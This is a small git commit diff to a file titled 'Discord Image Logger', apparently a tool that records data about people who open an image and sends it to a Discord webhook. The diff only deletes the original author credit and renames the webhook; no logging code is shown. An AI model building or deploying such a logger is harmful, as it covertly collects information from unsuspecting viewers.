d68d052290a9ed60d863aea0ac9faa282c054afb
Markikosa21 <125832168+Markikosa21@users.noreply.github.com>
2025-03-04 20:32:21 +0100

    Update discord.py

--- api/discord.py
+++ api/discord.py
@@ -1,6 +1,4 @@
 # Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -18,7 +16,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Kzen!", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
